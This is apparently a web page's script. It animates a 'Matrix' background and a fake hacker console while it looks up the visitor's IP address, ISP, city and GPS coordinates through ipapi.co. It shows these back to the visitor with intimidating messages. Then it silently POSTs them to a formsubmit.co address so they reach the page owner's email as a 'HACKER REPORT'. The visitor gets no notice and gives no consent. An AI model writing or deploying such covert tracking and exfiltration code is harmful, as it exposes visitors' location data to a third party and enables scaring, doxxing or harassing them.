<script>
    // --- MATRIX BACKGROUND ---
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const letters = "0123456789ABCDEF";
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);
    function draw() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
        for (let i = 0; i < drops.length; i++) {
            const text = letters[Math.floor(Math.random() * letters.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(draw, 35);

    // --- CONSOLE HANDLER ---
    const consoleBox = document.getElementById('console');
    function addLine(text, type = "") {
        const div = document.createElement('div');
        div.className = "line " + type;
        div.innerText = "> " + text;
        consoleBox.appendChild(div);
        consoleBox.scrollTop = consoleBox.scrollHeight;
    }

    // --- THE DELAYED PULL LOGIC ---
    fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        // These lines appear one-by-one
        const sequence = [
            { t: "ESTABLISHING_HANDSHAKE...", s: 500 },
            { t: "LOCALIZING_NODE_ORIGIN...", s: 1000 },
            { t: `IP_ADDRESS_FOUND: ${data.ip}`, s: 1500, c: "blue" },
            { t: "DECRYPTING_ISP_CARRIER...", s: 2200 },
            { t: `CARRIER: ${data.org}`, s: 2800, c: "blue" },
            { t: "TRIANGULATING_GPS_COORDINATES...", s: 3500 },
            { t: `LAT/LONG: ${data.latitude}, ${data.longitude}`, s: 4200, c: "blue" },
            { t: `SUBURB_IDENTIFIED: ${data.city}`, s: 4800, c: "blue" },
            { t: "UPLOADING_LOGS_TO_CLOUD_DATABASE...", s: 5500 },
            { t: "SCAN_COMPLETE. SESSION_ENCRYPTED.", s: 6200, c: "yellow" }
        ];

        sequence.forEach(item => {
            setTimeout(() => {
                addLine(item.t, item.c || "");
            }, item.s);
        });

        // 4. Send the data to your email after 6 seconds
        setTimeout(() => {
            fetch("https://formsubmit.co/ajax/jabuvo", {
                method: "POST",
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify({
                    _subject: "🎯 HACKER REPORT: " + data.ip,
                    Target_IP: data.ip,
                    ISP: data.org,
                    Location: `${data.city}, ${data.region}`,
                    GPS: `${data.latitude}, ${data.longitude}`
                })
            });
        }, 6500);
    });
</script>
